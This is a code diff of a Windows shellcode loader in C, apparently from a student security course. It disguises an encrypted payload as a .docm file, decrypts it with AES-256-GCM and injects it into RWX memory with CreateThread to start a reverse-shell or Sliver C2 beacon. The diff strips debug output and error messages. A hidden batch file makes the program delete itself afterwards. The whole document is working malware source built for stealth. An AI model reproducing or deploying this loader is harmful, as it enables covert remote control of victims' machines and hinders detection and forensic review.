@@ -1,31 +1,26 @@
 /*
  * AES-256-GCM Shellcode Loader with Memory Injection
- * 1. Đọc file BT7.docm (encrypted shellcode)
- * 2. Giải mã bằng AES-256-GCM
+ * 1. Read BT7.docm file (encrypted shellcode)
+ * 2. Decrypt using AES-256-GCM
  * 3. Memory injection: VirtualAlloc -> memcpy -> VirtualProtect -> CreateThread
- * 4. Shellcode thực thi reverse shell
+ * 4. Execute shellcode reverse shell
  */
-
 #include <windows.h>
 #include <bcrypt.h>
 #include <stdio.h>
-
 #pragma comment(lib, "bcrypt.lib")
 
-// Cấu hình mã hóa
+// Encryption configuration
 #define AES_KEY_SIZE 32      // AES-256
 #define SALT_SIZE 16
-#define NONCE_SIZE 12        // GCM nonce
-#define TAG_SIZE 16          // GCM authentication tag
-
-// Password để derive key
+#define NONCE_SIZE 12
+#define TAG_SIZE 16
+// Password for key derivation
 const char* PASSWORD = "NT230_Group5_Key";
-
-// Tên file encrypted shellcode - sẽ đổi tên thành .docm
+// Encrypted shellcode filename
 const char* ENCRYPTED_FILE = "BT7.docm";
-
 /*
- * Derive AES key từ password sử dụng PBKDF2
+ * Derive AES key from password using PBKDF2
  */
 BOOL DeriveKeyFromPassword(
     const char* password,
@@ -38,7 +33,7 @@ BOOL DeriveKeyFromPassword(
     NTSTATUS status;
     BOOL result = FALSE;
 
-    // Mở SHA256 algorithm provider cho PBKDF2
+    // Open SHA256 algorithm provider for PBKDF2
     status = BCryptOpenAlgorithmProvider(
         &hAlg,
         BCRYPT_SHA256_ALGORITHM,
@@ -50,14 +45,14 @@ BOOL DeriveKeyFromPassword(
         return FALSE;
     }
 
-    // Derive key với PBKDF2
+    // Derive key with PBKDF2
     status = BCryptDeriveKeyPBKDF2(
         hAlg,
         (PUCHAR)password,
         strlen(password),
         salt,
         saltLen,
-        100000,  // iterations - phải khớp với Python
+        100000,
         key,
         keyLen,
         0
@@ -71,9 +66,8 @@ BOOL DeriveKeyFromPassword(
     BCryptCloseAlgorithmProvider(hAlg, 0);
     return TRUE;
 }
-
 /*
- * Giải mã AES-256-GCM sử dụng BCrypt API
+ * Decrypt AES-256-GCM using BCrypt API
  */
 BOOL DecryptAESGCM(
     BYTE* encrypted,
@@ -130,7 +124,7 @@ BOOL DecryptAESGCM(
     BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
     authInfo.pbNonce = nonce;
     authInfo.cbNonce = NONCE_SIZE;
-    authInfo.pbTag = encrypted + encryptedLen - TAG_SIZE;  // Tag ở cuối
+    authInfo.pbTag = encrypted + encryptedLen - TAG_SIZE;
     authInfo.cbTag = TAG_SIZE;
 
     // Allocate output buffer
@@ -145,7 +139,7 @@ BOOL DecryptAESGCM(
     status = BCryptDecrypt(
         hKey,
         encrypted,
-        encryptedLen - TAG_SIZE,  // Không bao gồm tag
+        encryptedLen - TAG_SIZE,
         &authInfo,
         NULL,
         0,
@@ -169,9 +163,8 @@ cleanup:
     if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
     return result;
 }
-
 /*
- * Đọc encrypted shellcode từ file với retry logic
+ * Read encrypted shellcode from file with retry logic
  */
 BOOL ReadEncryptedFile(
     const char* filename,
@@ -181,10 +174,10 @@ BOOL ReadEncryptedFile(
     DWORD* encryptedLen
 ) {
     HANDLE hFile = INVALID_HANDLE_VALUE;
-    int retries = 10;  // Retry 10 lần
-    int delay = 500;   // Delay 500ms giữa mỗi lần
+    int retries = 10;
+    int delay = 500;
     
-    // Retry logic - đợi file sẵn sàng
+    // Retry logic - wait for file to be ready
     for (int i = 0; i < retries; i++) {
         hFile = CreateFileA(
             filename,
@@ -200,7 +193,7 @@ BOOL ReadEncryptedFile(
             break;  // File opened successfully
         }
         
-        // Wait trước khi retry
+        // Wait before retry
         Sleep(delay);
     }
 
@@ -240,7 +233,6 @@ BOOL ReadEncryptedFile(
 
     CloseHandle(hFile);
     return TRUE;
-
 error:
     free(*salt);
     free(*nonce);
@@ -250,68 +242,40 @@ error:
 }
 
 /*
- * Memory Injection - Inject shellcode vào memory và thực thi
+ * Memory Injection - Inject shellcode into memory and execute
  */
 BOOL InjectAndExecuteShellcode(BYTE* shellcode, DWORD shellcodeLen) {
     DWORD oldProtect;
-
-    // 1. VirtualAlloc - Cấp phát memory với quyền EXECUTE_READWRITE
+    // 1. VirtualAlloc - Allocate memory with EXECUTE_READWRITE permission
     LPVOID execMem = VirtualAlloc(
         NULL,
         shellcodeLen,
         MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE  // Dùng RWX luôn, tránh lỗi permission
+        PAGE_EXECUTE_READWRITE
     );
-
     if (execMem == NULL) {
-        #ifdef DEBUG
-        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
-        #endif
         return FALSE;
     }
-
-    #ifdef DEBUG
-    printf("[+] Memory allocated at: 0x%p\n", execMem);
-    #endif
-
-    // 2. Copy shellcode vào memory
+    // 2. Copy shellcode to memory
     memcpy(execMem, shellcode, shellcodeLen);
-
-    #ifdef DEBUG
-    printf("[+] Shellcode copied to memory\n");
-    #endif
-
-    // 3. CreateThread - Tạo thread độc lập
+    // 3. CreateThread
     DWORD threadId;
     HANDLE hThread = CreateThread(
         NULL,
         0,
         (LPTHREAD_START_ROUTINE)execMem,
         NULL,
-        0,  // Start ngay
+        0,
         &threadId
     );
-
     if (hThread == NULL) {
-        #ifdef DEBUG
-        printf("[-] CreateThread failed: %d\n", GetLastError());
-        #endif
         VirtualFree(execMem, 0, MEM_RELEASE);
         return FALSE;
     }
-
-    #ifdef DEBUG
-    printf("[+] Thread created with ID: %d\n", threadId);
-    #endif
-    
-    // 4. Detach thread handle - thread tự quản lý lifecycle
+    // 4. Detach thread handle
     CloseHandle(hThread);
-    
-    // KHÔNG cleanup execMem - shellcode cần memory này
-
     return TRUE;
 }
-
 /*
  * Self-delete executable file
  */
@@ -319,47 +283,37 @@ BOOL SelfDelete() {
     char szModuleName[MAX_PATH];
     char szCmd[MAX_PATH * 2];
     char szBatchFile[MAX_PATH];
-    
-    // Get path của executable hiện tại
+    // Get current executable path
     GetModuleFileNameA(NULL, szModuleName, MAX_PATH);
-    
-    // Tạo temp batch file
+    // Create temp batch file
     GetTempPathA(MAX_PATH, szBatchFile);
     strcat(szBatchFile, "tmp_del.bat");
-    
-    // Tạo batch script để xóa executable
+    // Create batch script to delete executable
     FILE* fp = fopen(szBatchFile, "w");
     if (fp == NULL) {
         return FALSE;
     }
-    
-    // Batch script: đợi 2 giây, xóa exe, xóa chính nó
+    // Batch script: wait 2 seconds, delete exe, delete itself
     fprintf(fp, "@echo off\n");
     fprintf(fp, "timeout /t 2 /nobreak > nul\n");
     fprintf(fp, "del /f /q \"%s\" > nul 2>&1\n", szModuleName);
     fprintf(fp, "del /f /q \"%%~f0\" > nul 2>&1\n");
     fclose(fp);
-    
-    // Chạy batch file ẩn
+    // Run batch file hidden
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
-    
     sprintf(szCmd, "cmd.exe /c \"%s\"", szBatchFile);
-    
     if (!CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, 
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         return FALSE;
     }
-    
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    
     return TRUE;
 }
-
 /*
  * Main entry point
  */
@@ -371,135 +325,38 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     BYTE* shellcode = NULL;
     DWORD shellcodeLen = 0;
     BYTE key[AES_KEY_SIZE];
-
-    // Debug: Show console for debugging (comment out for production)
-    #ifdef DEBUG
-    AllocConsole();
-    FILE* console;
-    freopen_s(&console, "CONOUT$", "w", stdout);
-    printf("[*] Loader started\n");
-    #endif
-
-    // 1. Đọc encrypted shellcode từ file
-    #ifdef DEBUG
-    printf("[*] Reading encrypted file: %s\n", ENCRYPTED_FILE);
-    #endif
-    
+    // 1. Read encrypted shellcode from file
     if (!ReadEncryptedFile(ENCRYPTED_FILE, &salt, &nonce, &encrypted, &encryptedLen)) {
-        #ifdef DEBUG
-        printf("[-] Failed to read encrypted file\n");
-        printf("[-] Error code: %d\n", GetLastError());
-        #else
-        MessageBoxA(NULL, "Failed to read encrypted file", "Error", MB_OK | MB_ICONERROR);
-        #endif
         return 1;
     }
-
-    #ifdef DEBUG
-    printf("[+] Encrypted file read successfully\n");
-    printf("[+] Encrypted size: %d bytes\n", encryptedLen);
-    #endif
-
-    // 2. Derive key từ password
-    #ifdef DEBUG
-    printf("[*] Deriving key from password...\n");
-    #endif
-    
+    // 2. Derive key from password
     if (!DeriveKeyFromPassword(PASSWORD, salt, SALT_SIZE, key, AES_KEY_SIZE)) {
-        #ifdef DEBUG
-        printf("[-] Failed to derive key\n");
-        #else
-        MessageBoxA(NULL, "Failed to derive key", "Error", MB_OK | MB_ICONERROR);
-        #endif
         goto cleanup;
     }
-
-    #ifdef DEBUG
-    printf("[+] Key derived successfully\n");
-    #endif
-
-    // 3. Giải mã shellcode
-    #ifdef DEBUG
-    printf("[*] Decrypting shellcode...\n");
-    #endif
-    
+    // 3. Decrypt shellcode
     if (!DecryptAESGCM(encrypted, encryptedLen, key, nonce, &shellcode, &shellcodeLen)) {
-        #ifdef DEBUG
-        printf("[-] Failed to decrypt shellcode\n");
-        #else
-        MessageBoxA(NULL, "Failed to decrypt shellcode", "Error", MB_OK | MB_ICONERROR);
-        #endif
         goto cleanup;
     }
-
-    #ifdef DEBUG
-    printf("[+] Shellcode decrypted successfully\n");
-    printf("[+] Shellcode size: %d bytes\n", shellcodeLen);
-    #endif
-
-    // 4. Inject và thực thi shellcode
-    #ifdef DEBUG
-    printf("[*] Injecting and executing shellcode...\n");
-    #endif
-    
+    // 4. Inject and execute shellcode
     if (!InjectAndExecuteShellcode(shellcode, shellcodeLen)) {
-        #ifdef DEBUG
-        printf("[-] Failed to execute shellcode\n");
-        #else
-        MessageBoxA(NULL, "Failed to execute shellcode", "Error", MB_OK | MB_ICONERROR);
-        #endif
         goto cleanup;
     }
-
-    #ifdef DEBUG
-    printf("[+] Shellcode injected and thread created\n");
-    printf("[*] Beacon should callback to C2 now\n");
-    printf("[*] Process will stay alive to prevent thread termination\n");
-    printf("[*] Keeping process alive for 60 seconds...\n");
-    printf("[!] Check Sliver console for beacon connection\n\n");
-    
-    // Wait 60 giây với status updates
-    for (int i = 60; i > 0; i--) {
-        if (i % 10 == 0) {
-            printf("[*] %d seconds remaining... (Check 'beacons' in Sliver)\n", i);
-        }
-        Sleep(1000);
-    }
-    
-    printf("\n[*] Timeout reached.\n");
-    printf("[*] If beacon connected, it should remain active even after this exits.\n");
-    printf("[!] Self-delete disabled in DEBUG mode\n");
-    printf("[*] Press Enter to exit...\n");
-    getchar();
-    #else
-    // Production: Keep alive, then self-delete
+    // Keep alive, then self-delete
     Sleep(10000);  // Wait 10 seconds for beacon to callback
-    
     // Self-delete executable
     SelfDelete();
-    #endif
-
-    // 5. Cleanup memory ngay sau khi inject (shellcode đã được copy vào execMem)
+    // 5. Cleanup memory after injection (shellcode already copied to execMem)
     if (salt) free(salt);
     if (nonce) free(nonce);
     if (encrypted) free(encrypted);
     if (shellcode) VirtualFree(shellcode, 0, MEM_RELEASE);
-
-    // Exit ngay - beacon sẽ chạy trong background thread
+    // Exit immediately - beacon will run in background thread
     return 0;
-
 cleanup:
     // Cleanup memory
     if (salt) free(salt);
     if (nonce) free(nonce);
     if (encrypted) free(encrypted);
     if (shellcode) VirtualFree(shellcode, 0, MEM_RELEASE);
-
-    #ifdef DEBUG
-    printf("[*] Cleanup completed\n");
-    printf("[*] Press Enter to exit...\n");
-    getchar();
-    #endif
-
     return 1;
 }
